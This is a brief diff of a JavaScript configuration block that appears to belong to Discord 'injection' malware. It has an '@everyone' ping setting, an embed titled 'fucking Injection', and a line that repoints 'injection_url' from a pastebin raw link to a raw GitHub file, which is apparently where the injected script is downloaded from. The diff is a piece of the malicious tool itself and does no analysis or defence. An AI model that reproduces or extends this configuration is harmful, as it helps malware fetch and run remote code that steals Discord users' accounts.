@@ -13,7 +13,7 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'fucking Injection', 
   embed_color: 2895667, 
-  injection_url: 'https://pastebin.com/raw/quneE5ZB', 
+  injection_url: 'https://raw.githubusercontent.com/cj963679/test/main/index.js', 
   /**
    
    **/
